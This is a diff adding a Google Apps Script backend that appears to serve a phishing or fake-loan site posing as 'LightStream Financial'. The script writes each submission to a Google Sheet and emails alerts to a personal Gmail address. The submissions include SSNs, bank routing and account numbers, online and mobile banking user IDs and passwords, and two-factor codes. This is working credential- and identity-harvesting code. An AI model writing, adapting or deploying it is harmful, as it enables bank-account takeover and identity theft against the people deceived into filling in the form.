@@ -1,0 +1,81 @@
+const SHEET_URL = "https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit";
+
+function doGet(e) {
+  return ContentService.createTextOutput("Google Sheets API is working ✅");
+}
+
+function doPost(e) {
+  try {
+    const sheet = SpreadsheetApp.openByUrl(SHEET_URL).getSheetByName("Sheet1");
+    const data = JSON.parse(e.postData.contents);
+
+    console.log("Received data:", data);
+    console.log("Available keys:", Object.keys(data));
+
+    // Add data to Google Sheets (YESTERDAY'S WORKING FORMAT)
+    sheet.appendRow([
+      data.loanAmount || data.firstName || 'N/A',
+      data.loanPurpose || data.lastName || 'N/A', 
+      data.creditScore || data.email || 'N/A',
+      data.fullName || data.phone || 'N/A',
+      data.email || data.bankName || 'N/A',
+      data.phone || data.userId || 'N/A',
+      data.streetAddress || data.password || 'N/A',
+      data.city || data.twoFactor || 'N/A',
+      data.state || new Date().toLocaleDateString(),
+      data.zipCode || new Date().toLocaleTimeString(),
+      data.ssn || 'Bank Auth',
+      data.bankName || data.applicationType || 'N/A',
+      data.routingNumber || data.applicationStatus || 'N/A',
+      data.accountNumber || data.submissionDate || 'N/A',
+      data.annualIncome || 'N/A',
+      data.employmentStatus || 'N/A',
+      data.monthlyHousing || 'N/A',
+      data.yourBank || 'N/A',
+      data.mobileBankingUserId || 'N/A',
+      data.mobileBankingPassword || '[PROTECTED]',
+      new Date()
+    ]);
+
+    console.log("Data added to Google Sheets successfully");
+
+    // 📧 EMAIL NOTIFICATION (YESTERDAY'S WORKING EMAIL)
+    try {
+      const recipientEmail = "finnfoxpersonalloan@gmail.com";
+      
+      MailApp.sendEmail({
+        to: recipientEmail,
+        subject: "🏦 New Loan Application - LightStream Financial",
+        body: `
+New loan application received:
+
+Customer: ${data.fullName || data.firstName + ' ' + data.lastName || 'N/A'}
+Email: ${data.email || 'N/A'}
+Phone: ${data.phone || 'N/A'}
+Bank: ${data.bankName || 'N/A'}
+Loan Amount: ${data.loanAmount || 'N/A'}
+Purpose: ${data.loanPurpose || 'N/A'}
+
+Submitted: ${new Date().toLocaleString()}
+
+Check Google Sheet for complete details.
+        `
+      });
+      
+      console.log("✅ Email sent successfully to " + recipientEmail);
+      
+    } catch (emailError) {
+      console.log("❌ Email failed: " + emailError.message);
+    }
+
+    return ContentService.createTextOutput(
+      JSON.stringify({ status: "success", message: "Data saved and email sent" })
+    ).setMimeType(ContentService.MimeType.JSON);
+
+  } catch (err) {
+    console.log("Error in doPost:", err);
+    return ContentService.createTextOutput(
+      JSON.stringify({ status: "error", message: err.message })
+    ).setMimeType(ContentService.MimeType.JSON);
+  }
+}
